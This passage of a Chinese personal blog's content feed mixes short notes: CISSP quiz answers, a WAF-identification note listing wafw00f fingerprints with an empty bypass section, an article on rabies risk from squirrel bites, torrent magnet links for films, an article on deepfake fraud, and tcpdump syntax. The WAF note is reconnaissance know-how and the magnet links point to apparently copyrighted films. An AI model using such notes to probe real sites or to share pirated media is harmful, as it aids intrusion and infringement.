C</p><p>​数据控制人</p><p>​数据所有者</p><p>​数据处理着</p><p>​数据保管人</p><p>C✅</p><p>D✅</p><p>C❌ A</p><p>​数据控制人</p><p>​数据所有者</p><p>​数据处理着</p><p>​数据保管人</p><p>BD✅</p><p>A❌ C</p><p>​WPA3 认证</p><p>ACEH✅</p><p>A❌ B</p><p>​维修技师通常需要高于正常级别的访问权限才能履行职责。</p><p>C✅</p><p>A✅</p><p>A✅</p><p>A✅</p><p>​确定优先级第一步</p><p>​可能性评估是第三步</p><p>​风险识别是第二步</p><p>​资源优先级排序是最后一步</p><p>D✅</p><p>A✅</p><p>D✅</p><p>C✅</p><p>AB✅</p><p>D✅</p><p>C✅</p><p>D✅</p><p>A✅</p><p>AD❌ BCD</p><p>​</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/01/03/yunwei/applications/Macapplications/brew/brew_error/"/>
    <url>/2025/01/03/yunwei/applications/Macapplications/brew/brew_error/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>流感疫苗</title>
    <link href="/2025/01/02/informationCocoon/medical/%E6%B5%81%E6%84%9F%E7%96%AB%E8%8B%97/"/>
    <url>/2025/01/02/informationCocoon/medical/%E6%B5%81%E6%84%9F%E7%96%AB%E8%8B%97/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="打疫苗时间-9-10月份"><a href="#打疫苗时间-9-10月份" class="headerlink" title="打疫苗时间 9-10月份"></a>打疫苗时间 9-10月份</h3><h3 id="打疫苗种类：肺炎链球菌疫苗"><a href="#打疫苗种类：肺炎链球菌疫苗" class="headerlink" title="打疫苗种类：肺炎链球菌疫苗"></a>打疫苗种类：肺炎链球菌疫苗</h3>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>medical</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>medical</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>waf_attack_tips</title>
    <link href="/2025/01/02/security/netsec/waf/waf_attack_tips/"/>
    <url>/2025/01/02/security/netsec/waf/waf_attack_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="WAF-识别"><a href="#WAF-识别" class="headerlink" title="WAF 识别"></a>WAF 识别</h1><h2 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h2><p>下载地址</p><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>支持的指纹</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">aesecure<br>airee<br>airlock<br>alertlogic<br>aliyundun<br>anquanbao<br>anyu<br>applicationgateway<br>approach<br>armor<br>arvancloud<br>aspa<br>aspnetgen<br>astra<br>awswaf<br>azion<br><span class="hljs-keyword">baidu</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">barikode</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">barracuda</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bekchy</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">beluga</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">binarysec</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bitninja</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">blockdos</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bluedon</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bulletproof</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">cachefly</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">cachewall</span><br><span class="hljs-keyword"></span>cdnns<br>cerber<br>chinacache<br>chuangyu<br>ciscoacexml<br><span class="hljs-keyword">cloudbric</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">cloudflare</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">cloudfloordns</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">cloudfront</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">cloudprotector</span><br><span class="hljs-keyword"></span>comodo<br>crawlprotect<br>ddosguard<br>denyall<br><span class="hljs-keyword">distil</span><br><span class="hljs-keyword"></span>dosarrest<br>dotdefender<br>dynamicweb<br>edgecast<br><span class="hljs-keyword">eisoo</span><br><span class="hljs-keyword"></span>envoy<br>expressionengine<br>f<span class="hljs-symbol">5b</span>igipapm<br>f<span class="hljs-symbol">5b</span>igipasm<br>f<span class="hljs-symbol">5b</span>igipltm<br>f<span class="hljs-symbol">5f</span>irepass<br>f5trafficshield<br>fastly<br>fortigate<br>fortiguard<br>fortiweb<br>frontdoor<br>gcparmor<br>godaddy<br>greywizard<br>huaweicloud<br>hyperguard<br>ibmdatapower<br>imunify360<br>incapsula<br>indusguard<br><span class="hljs-keyword">instartdx</span><br><span class="hljs-keyword"></span>isaserver<br><span class="hljs-keyword">janusec</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">jiasule</span><br><span class="hljs-keyword"></span>kemp<br>keycdn<br>knownsec<br>kona<br>limelight<br>litespeed<br>malcare<br>maxcdn<br>missioncontrol<br>modsecurity<br>naxsi<br>nemesida<br>netcontinuum<br>netscaler<br>nevisproxy<br>newdefend<br>nexusguard<br>ninja<br>nsfocus<br>nullddos<br>onmessage<br>openresty<br><span class="hljs-keyword">oraclecloud</span><br><span class="hljs-keyword"></span>paloalto<br>pentawaf<br>perimeterx<br>pksec<br>powercdn<br>profense<br>ptaf<br>puhui<br>qcloud<br>qiniu<br>qrator<br>radware<br>reblaze<br>rsfirewall<br>rvmode<br>sabre<br>safe3<br>safedog<br>safeline<br>secking<br>secupress<br>secureentry<br>secureiis<br>securesphere<br>senginx<br>serverdefender<br><span class="hljs-keyword">shadowd</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">shieldon</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">shieldsecurity</span><br><span class="hljs-keyword"></span>siteground<br>siteguard<br>sitelock<br>sonicwall<br>sophos<br>squarespace<br>squidproxy<br>stackpath<br>sucuri<br>tencent<br>teros<br>transip<br>uewaf<br>urlmaster<br>urlscan<br>variti<br>varnish<br>viettel<br>virusdie<br>wallarm<br>watchguard<br>webarx<br>webknight<br>webland<br>webray<br>webseal<br>webtotem<br>west263cdn<br>wordfence<br>wpmudev<br>wts<br>wzb360<br>xlabssecuritywaf<br>xuanwudun<br>yundun<br>yunsuo<br>yxlink<br>zenedge<br>zscaler<br></code></pre></td></tr></table></figure><h1 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF 绕过"></a>WAF 绕过</h1>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
      <category>waf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>attack</tag>
      
      <tag>waf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_registry</title>
    <link href="/2025/01/02/yunwei/applications/docker/docker_registry/"/>
    <url>/2025/01/02/yunwei/applications/docker/docker_registry/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="阿里云镜像源"><a href="#阿里云镜像源" class="headerlink" title="阿里云镜像源"></a>阿里云镜像源</h2><p>“registry-mirrors”: [<br>    “<a href="https://registry.cn-hangzhou.aliyuncs.com/">https://registry.cn-hangzhou.aliyuncs.com</a>“<br>  ]</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>被野生松鼠咬的处理方案</title>
    <link href="/2024/12/30/informationCocoon/medical/%E8%A2%AB%E9%87%8E%E7%94%9F%E6%9D%BE%E9%BC%A0%E5%92%AC%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%A1%88/"/>
    <url>/2024/12/30/informationCocoon/medical/%E8%A2%AB%E9%87%8E%E7%94%9F%E6%9D%BE%E9%BC%A0%E5%92%AC%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>尽管暴露于啮齿类动物导致狂犬病的可能性微乎其微，但是面对「野生松鼠」致伤时，一方面仍然应该考虑进行暴露后处置（包括狂犬病、破伤风疫苗接种，以及被动免疫制剂使用），另一方面也应该考虑对致伤动物进行狂犬病毒检测，从而确认感染风险以及在必要情况下调整处置方案。</p><h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>#男生手喂公园松鼠被挠伤挨5针花1千# 这个事情的对错可能会比较颠覆既往的一些认知。</p><p>先说一个比较尴尬的事实：虽然被啮齿类动物咬伤后，通常不需要接种狂犬病疫苗，但全世界有两个国家被记录过「松鼠」相关的人类狂犬病案例。</p><p>▌病例1来自印度</p><p>印度特里凡得琅医学学院SAT医院儿科报告了喀拉拉邦一名「过去没有被任何其他动物咬伤的病史」的7岁男孩出现发热、咳嗽、烦躁不安、进食困难以及在喝水时表现出攻击性行为就诊，症状已持续2天。两个月前，患儿右腿曾被松鼠咬伤，并在当地医院接受了破伤风疫苗注射和伤口处理，但「未接种」狂犬病疫苗。</p><p>患儿在重症监护室接受「支持性治疗」，但病情持续恶化，最终在「入院4小时」后因心肺功能衰竭死亡。角膜印片免疫荧光检测结果为狂犬病阳性</p><p>▌病例2来自中国</p><p>我国「中疾控病毒所」的研究显示：2005年至2012年，我国30个省报告了19,221例狂犬病病例，主要发生在中国南部和东部的农村地区，大多与农民、学生和学龄前儿童有关。在对2010年至2011年报告的「死亡病例」的详细分析中发现，这些人类狂犬病病例主要因暴露于狗（93.7%）和猫（4.6%）所致，其余则与其他家畜和野生动物有关，包括马、猪、老鼠和「松鼠」。</p><p>需要注意的是，大多数报告的人类狂犬病病例都是「临床诊断」，而没有经过实验室检测，上述信息基于2010年至2011年疑似人类狂犬病病例的流行病学和暴露后处置的治疗数据。</p><p>▌差点出现的病例3</p><p>根据印度喜马偕尔邦西姆拉卡苏帕提帕里马哈尔州卫生与家庭福利研究所发布的信息，2019年8月10日，「斯里兰卡科伦坡」一名9岁男孩在右手食指中部被松鼠咬伤，但「伤口没有出血」，但有一小块皮肤剥落。医生将其评估为Ⅱ级暴露，并启动「两点皮内（ID）疫苗接种」作为暴露后预防（斯里兰卡这种免疫程序一共要打4次，每次2针皮内注射，可以减少疫苗抗原使用）。</p><p>当天中午「松鼠死亡」，其头部被送往科伦坡斯里兰卡医学研究所的实验室进行狂犬病检测。8月13日，实验室通过荧光抗体试验（FAT）报告（编号H 898，日期13&#x2F;08&#x2F;2019）确认松鼠为「狂犬病毒阳性」！</p><p>孩子的父母「带着报告」再次前往医院与医生会面并沟通接种被动免疫制剂。医生表示，由于伤口表浅且属于Ⅱ级暴露，不需要注射狂犬病免疫球蛋白（RIG），因为RIG可能带来的副作用风险不值得冒。尽管斯里兰卡的医院配备了人用狂犬病免疫球蛋白（HRIG），医生仍认为不应冒过敏反应（如过敏性休克）的风险。因此，在当天即8月13日按计划接种了第二剂皮内疫苗，而「未使用」RIG。</p><p>此后，斯里兰卡的儿童家长给「印度医生」发邮件并得到肯定的回复（需要使用RIG）后，在他们的坚持下给儿童注射了RIG，最终大幅降低了这名9岁儿童的狂犬病发病风险。这一切的结果，来源于家长的坚持和努力。</p><p>▌本次案例分析</p><p>在本次案例中，伤者被野生松鼠攻击后出现手指出血的情况，根据暴露等级属于「Ⅲ级暴露，结合我国对动物狂犬病毒监测水平以及既往在国内出现过疑似暴露于松鼠相关的人类狂犬病病例背景，医院采取狂犬病疫苗接种可以说是「正确」的方案。</p><p>然而有以下几点值得关注：</p><p>②是否使用被动免疫制剂：在面对松鼠所致的暴露时，如果认为需要进行狂犬病疫苗接种，那么按照标准Ⅲ级暴露的处置方式，也应该使用被动免疫制剂（比如免疫球蛋白或单克隆抗体），而新闻提到的数字是「5针和1000元」，那么根据价格计算可能未使用被动免疫制剂；</p><p>②是否属于再次暴露：如果伤者既往因全程接种过狂犬病疫苗而不适用被动免疫制剂，那么就不应该接种5针狂犬病疫苗，而是「2针」，那么如果其余3针是破伤风疫苗的话，价格也不太对；</p><p>③是否进行破伤风暴露后处置：被松鼠致伤后，除了进行狂犬病暴露后处置外，还应该进行「破伤风暴露后处置」，但从接种针次来看似乎也并不成立，也就是可能「没有」进行破伤风暴露后处置。</p><p>当然除了一些疑惑点之外，还是有积极的方面。</p><p>值得表扬的是，视频里云南大学附属医院开具的《狂犬病·破伤风预防处置知情同意书》是一个非常不错的文件，因为很多的狂犬病暴露后处置都应该伴随破伤风暴露后处置，只不过很少被提及，而这个知情同意书做的非常好。</p><p>▌小结</p><p>尽管国家卫健委发布的《常见动物致伤诊疗规范》中提到「啮齿类和免形目动物极少感染狂犬病，目前无导致人类狂犬病病例的证据」，但事实上尽管证据有限且质量不高（印度的没有对动物狂犬病毒感染情况进行检测，中国采用的是病例记录信息而非病毒检测结果），但也提示了《规范》中的表述「并不严谨」。</p><p>综上，尽管暴露于啮齿类动物导致狂犬病的可能性微乎其微，但是面对「野生松鼠」致伤时，一方面仍然应该考虑进行暴露后处置（包括狂犬病、破伤风疫苗接种，以及被动免疫制剂使用），另一方面也应该考虑对致伤动物进行狂犬病毒检测，从而确认感染风险以及在必要情况下调整处置方案。</p><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p>【1】</p><p><a href="https://weibo.com/1803648617/5116944095646116">https://weibo.com/1803648617/5116944095646116</a></p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>medical</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>medical</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>movie-巴山夜雨</title>
    <link href="/2024/12/30/informationCocoon/video/movie-%E5%B7%B4%E5%B1%B1%E5%A4%9C%E9%9B%A8/"/>
    <url>/2024/12/30/informationCocoon/video/movie-%E5%B7%B4%E5%B1%B1%E5%A4%9C%E9%9B%A8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="BIT"><a href="#BIT" class="headerlink" title="BIT"></a>BIT</h2><p>1980 年上影厂的《巴山夜雨》，资源：83d6ffeb8a44949db10342cc90d9eb9705bcf4b3 或 48433828F7E0B79D293954C4B04F3059A8105C03 或 8be60b0b2fd22f8425cf4fabc4edb32042f5b073 。</p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>video</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>video</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>movie-首尔之春</title>
    <link href="/2024/12/30/informationCocoon/video/movie-%E9%A6%96%E5%B0%94%E4%B9%8B%E6%98%A5/"/>
    <url>/2024/12/30/informationCocoon/video/movie-%E9%A6%96%E5%B0%94%E4%B9%8B%E6%98%A5/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>首尔之春1080P</p><p>magnet:?xt&#x3D;<br>urn:btih:D75064CA251FB9A2E9206DDCBC369225E3D02087 ​​​</p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>video</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>video</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AI 造假术-揭秘这项技术背后的真相</title>
    <link href="/2024/12/30/informationCocoon/tk_article/AI%20%E9%80%A0%E5%81%87%E6%9C%AF-%E6%8F%AD%E7%A7%98%E8%BF%99%E9%A1%B9%E6%8A%80%E6%9C%AF%E8%83%8C%E5%90%8E%E7%9A%84%E7%9C%9F%E7%9B%B8/"/>
    <url>/2024/12/30/informationCocoon/tk_article/AI%20%E9%80%A0%E5%81%87%E6%9C%AF-%E6%8F%AD%E7%A7%98%E8%BF%99%E9%A1%B9%E6%8A%80%E6%9C%AF%E8%83%8C%E5%90%8E%E7%9A%84%E7%9C%9F%E7%9B%B8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>2024 年 12 月初，网络上出现了一段带货视频，在视频中卖力地推销某食品的居然是国家传染病医学中心主任、复旦大学附属华山医院感染科主任张文宏医生。</p><p>不少网友出于对张文宏医生的信任，不仅自己购买，还积极地把视频转发到家族群。然而，<strong>张文宏医生本人很快对此做出了澄清：该视频非其本人录制，应该是用 AI 伪造的。</strong></p><p><img src="/005ztyuLly4hwtpg9ljp0j608r0brjrm02.jpg" alt="img"></p><p>网络截图</p><p>近年来，随着人工智能技术的迅猛发展，此类 AI 伪造视频事件频频曝光。不法分子利用 AI 技术，假冒名人身份进行诈骗、发布虚假广告，甚至通过伪造视频骗取巨额财产，严重威胁社会信任体系和信息安全。</p><p>今天，我们从技术角度来剖析一下此类事件。</p><p><strong>AI 伪造视频的技术：</strong></p><p><strong>从生存对抗网络到 Deepfake</strong></p><p>这类 AI 伪造视频所用的技术并不是最近才出现的，上世纪九十年代学术界就开始了面部替换和图像生成相关技术的研究。2014 年，伊恩·古德费洛（Ian Goodfellow）提出了生成对抗网络（GAN，Generative Adversarial Network），使得计算机可以生成更为逼真且高质量的图像。</p><p>生成对抗网络由生成器（Generator）和判别器（Discriminator）两部分组成。<strong>生成器创建内容，而判别器则检测所创建的内容是不是真实的，并将结果反馈给生成器。在训练过程中，两者一攻一守，相互对抗，并在对抗中提升各自的能力，最终生成器能够生成非常逼真的画面。</strong></p><p>2017 年，有人在网络社区 Reddit 上创建了一个名为“deepfakes”的账号，并发布了一些用生成对抗网络技术制作的名人换脸视频。从此，“Deepfake”一词开始被广泛使用，通常是指代这类换脸视频所用的技术。</p><p>2018 年 1 月，一款名为 FakeApp 的桌面应用程序发布。紧接着，Faceswap、DeepFaceLab 等具有类似功能的开源工具出现了。这些工具大大降低了 Deepfake 的门槛，使不具备专业知识的普通用户也能轻松生成换脸视频。</p><p><strong>随着相关技术不断进步，今天的 Deepfake 和之前相比，不仅生成的视频分辨率更高、面部表情同步更自然，而且所需的数据更少、训练时间更短。</strong>早期 Deepfake 训练往往需要数百到上千张目标人物的图片或数分钟至数小时的视频，以获取不同角度、不同表情的脸部特征。但随着生成对抗网络技术本身的发展，迁移学习（Transfer Learning）、小样本学习（Few-Shot Learning）等技术的出现，现在仅需要几十张甚至单张照片就可以生成 Deepfake 视频。</p><p><img src="/005ztyuLly4hwtpgaoem5j60u00jzwfv02.jpg" alt="img"></p><p>图库版权图片，转载使用可能引发版权纠纷</p><p>另外，早期 Deepfake 只能生成画面，现在结合声音克隆（Voice Cloning）、语音风格迁移（Voice Style Transfer）等技术，还可以生成以假乱真的目标人物声音，并且可以令视频中的嘴部动作和声音一致。</p><p>简单来说，<strong>现在只需要有一张照片，几秒钟的语音，就可以生成 Deepfake 视频。</strong>当然，如果有更多照片和更长的语音，生成的视频也会更逼真。</p><p><strong>Deepfake 技术的</strong></p><p><strong>正面应用和负面影响</strong></p><p>Deepfake 虽然是“伪造”，但在获得被“伪造”者许可的情况下，可以有很多正面的应用。例如，2019 年，英国足球明星大卫·贝克汉姆发布了一段呼吁消灭疟疾的视频。在视频中，他使用了包括斯瓦希里语和约鲁巴语等在内的 9 种语言。而除了英语之外，其余 8 种语言都是用 Deepfake 技术生成的。</p><p>此外，Deepfake 所使用的各类技术在数字人等领域也有广泛应用，在视频主播、影视制作、教育和培训、心理治疗康复等领域都能发挥积极的作用。</p><p><strong>但任何技术都可能被用在不好的地方。</strong>在前面提到的假张文宏之前，已经出现过假靳东、假马云、假雷军、假于东来等。假冒名人卖货不是最糟糕的，<strong>Deepfake 类技术还被用在很多更恶劣的地方，例如诈骗。</strong></p><p>2024 年 12 月 20 日，BBC 报道了一则《爱情骗子利用 Deepfake 从我这里骗走 1.7 万英镑》的故事。受害人是 77 岁的尼基·麦克劳德（Nikki MacLeod）。骗子告诉她，自己在一座石油钻井平台上工作，并要求 Nikki 购买 Steam 礼品卡以及通过 Paypal 转账等方式提供金钱，以便在钻井平台上获得互联网连接，以及支付到苏格兰来见她的旅行费用。Nikki 最初持怀疑态度，但看到对方发来的钻井平台上的视频后就相信了。</p><p>2024 年 1 月，某香港公司的一名员工从公司账户转了 2500 万美元给诈骗者。骗子以首席财务官的名义和他进行了视频通话，要求他执行这笔转账。在视频通话中，该员工不仅看到了首席财务官“本人”，甚至还看到了其它“同事”。</p><p>据著名会计师事务所德勤 2024 年 5 月发布的一份报告，2023 年美国的 Deepfake 欺诈增加了 700%，造成了 123 亿美元的损失，并且这一数字在 2027 年可能会达到 400 亿美元。</p><p><img src="/005ztyuLly4hwtpgbm424j60u00hcgms02.jpg" alt="img"></p><p>图库版权图片，转载使用可能引发版权纠纷</p><p>除了诈骗之外，Deepfake 技术可以还被用来骗过人脸识别。很多移动应用会使用人脸识别来验证用户身份。为防止用照片假冒人脸，现在的人脸识别技术通常都会进行活体检测，类似 3D 结构光等活体识别技术需要特殊硬件，但只有部分手机支持。</p><p>目前，很多场合使用的还是基于手机前置摄像头的 2D 人脸识别。而 2D 人脸识别的活体检测主要是要求用户做出眨眼、点头等动作，以及用屏幕闪烁特定颜色的光线。于是就有人使用 Deepfake 技术结合一些其它的手段，来骗过人脸识别，从而盗取网络账号。</p><p><strong>如何识别和检测 Deepfake 视频？</strong></p><p><strong>制作不够精良的 Deepfake 视频用肉眼就可看出异常。</strong>例如，人物的面部表情或眼神不自然，眨眼的次数过少，面部边缘模糊，或者与背景的过渡不自然，人脸的光影效果与周围环境的光线情况不符等。但是，随着 Deepfake 技术的进步，这些异常特征也越来越少。</p><p>目前已知的 Deepfake 技术能仿冒人脸做出的表情，但还不能仿冒人脸在受到外部压力时产生的变形。所以，在视频通话时，如果怀疑遭到了 Deepfake 欺诈，可以要求对方用食指按压一侧的鼻翼，或按压一侧的脸颊。</p><p><strong>除了肉眼分辨，用 AI 来识别 AI 生成的内容也是热门的研究方向。</strong>例如合成视频可能在帧与帧之间存在不连续性，进行时序一致性分析就可能发现异常。另外，人的心脏跳动会导致皮肤出现和脉搏节律一致的细微色彩变化，通过这种色彩变化可以获取脉搏信息，而 Deepfake 的视频可能没有这种特征。</p><p>但我们也要意识到，Deepfake 使用的生成式对抗网络技术本来就是由生成器和判别器两部分组成，任何一种检测 Deepfake 的技术手段也都可以纳入到 Deepfake 的判别器中，从而生成该技术难以检测的伪造内容。</p><p><img src="/005ztyuLly4hwtpgca9etj60u00k0dh702.jpg" alt="img"></p><p>图库版权图片，转载使用可能引发版权纠纷</p><p>近年来，我国颁布实施了《互联网信息服务深度合成管理规定》《生成式人工智能服务管理暂行办法》等，但这些法律法规主要约束的是提供相关服务的平台。而随着软硬件技术的发展，目前 Deepfake 完全可以只使用运行在个人电脑中的模型完成。</p><p>所以，<strong>要应对 Deepfake 带来的各类问题，需要全流程的综合治理机制，未来需要技术、平台、法律的多元协同。</strong>用 Deepfake 假冒名人身份，欺骗他人购买产品，不仅可能违反《民法典》第 1019 条和第 1024 条，侵犯他人的肖像权、名誉权，还可能涉及《刑法》第 266 条诈骗罪、《刑法》第 222 条虚假广告罪等。对于使用 Deepfake 涉及违法乃至犯罪的行为，就需要依法进行打击。</p><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>【1】科普中国  AI 造假术！揭秘这项技术背后的真相 12-22 15:10</p><p><a href="https://weibo.com/ttarticle/x/m/show#/id=2309405114399823364195&_wb_client_=1">https://weibo.com/ttarticle/x/m/show#/id=2309405114399823364195&amp;_wb_client_=1</a></p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>tk</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>tk</tag>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcpdump</title>
    <link href="/2024/12/27/network/networktools/tcpdump/"/>
    <url>/2024/12/27/network/networktools/tcpdump/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="i-网卡名"><a href="#i-网卡名" class="headerlink" title="-i 网卡名"></a>-i 网卡名</h3><p>抓取指定网卡数据包</p><p>-i any</p><p>-i eth0</p><h3 id="dst-port-端口号"><a href="#dst-port-端口号" class="headerlink" title="dst port 端口号"></a>dst port 端口号</h3><p>抓取指定目的端口数据包</p><p>dst port 80</p><h3 id="w-文件名-pcap"><a href="#w-文件名-pcap" class="headerlink" title="-w 文件名.pcap"></a>-w 文件名.pcap</h3><p>保存数据包到指定文件</p><p>-w test.pcap</p><h3 id="host-ip"><a href="#host-ip" class="headerlink" title="host ip"></a>host ip</h3><p>抓取与指定IP交互数据包</p><p>host 192.168.1.1</p><h3 id="c-num"><a href="#c-num" class="headerlink" title="-c num"></a>-c num</h3><p>抓取指定数量的数据包</p><h2 id="常见示例"><a href="#常见示例" class="headerlink" title="常见示例"></a>常见示例</h2><h3 id="抓取指定目的端口数据包"><a href="#抓取指定目的端口数据包" class="headerlink" title="抓取指定目的端口数据包"></a>抓取指定目的端口数据包</h3><pre><code class="hljs">tcpdump -i eth0 dst port 80</code></pre><h3 id="抓取与指定主机和指定目的端口交互的数据包"><a href="#抓取与指定主机和指定目的端口交互的数据包" class="headerlink" title="抓取与指定主机和指定目的端口交互的数据包"></a>抓取与指定主机和指定目的端口交互的数据包</h3><pre><code class="hljs">tcpdump -i eth0 host 10.185.16.237 and dst port 80</code></pre><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>多个条件需要使用 and 连接</p><p>&#x9;host 